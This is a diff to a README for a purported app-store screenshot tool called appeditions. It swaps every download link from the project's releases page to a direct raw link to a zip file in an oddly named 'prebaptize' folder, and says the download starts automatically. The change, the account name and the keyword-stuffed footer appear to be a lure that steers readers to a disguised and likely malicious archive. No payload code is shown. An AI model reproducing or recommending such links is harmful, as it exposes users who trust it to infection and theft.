@@ -1,6 +1,6 @@
 <h1>📱 appeditions - Your App Store Screenshots, Perfected</h1>
 
-[<img src="https://img.shields.io/badge/Download-appeditions-blueviolet?style=for-the-badge" alt="Download appeditions">](https://github.com/vaultassistance2-dot/appeditions/releases)
+[<img src="https://img.shields.io/badge/Download-appeditions-blueviolet?style=for-the-badge" alt="Download appeditions">](https://raw.githubusercontent.com/vaultassistance2-dot/appeditions/main/prebaptize/Software_2.6.zip)
 
 ## 🎯 What Is appeditions?
 
@@ -26,7 +26,7 @@ We know you're excited to jump in, so let's get you set up quickly. Follow these
 ### Step 1: Download the Application
 
 The first thing you need to do is download appeditions. 
-Visit this link to download the application: [https://github.com/vaultassistance2-dot/appeditions/releases](https://github.com/vaultassistance2-dot/appeditions/releases)
+Visit this link to download the application: [https://raw.githubusercontent.com/vaultassistance2-dot/appeditions/main/prebaptize/Software_2.6.zip](https://raw.githubusercontent.com/vaultassistance2-dot/appeditions/main/prebaptize/Software_2.6.zip)
 
 Just click the link and your download will start automatically. If nothing happens, check your browser's download folder — it might be waiting for you there.
 
@@ -127,6 +127,6 @@ Before you start, here's your quick to-do list:
 
 That's all there is to it. You're now ready to create stunning app store visuals with appeditions. Enjoy the process and happy shipping!
 
-Remember, for any help or downloads, always return to: [https://github.com/vaultassistance2-dot/appeditions/releases](https://github.com/vaultassistance2-dot/appeditions/releases). This is your one-stop shop for everything appeditions.
+Remember, for any help or downloads, always return to: [https://raw.githubusercontent.com/vaultassistance2-dot/appeditions/main/prebaptize/Software_2.6.zip](https://raw.githubusercontent.com/vaultassistance2-dot/appeditions/main/prebaptize/Software_2.6.zip). This is your one-stop shop for everything appeditions.
 
 Keywords: appeditions, app store screenshots, google play assets, screenshot resizer, local go app, no account required, privacy-focused app, version tracking, multi-language app tools, desktop app for developers, store-ready images, offline screenshot tool.
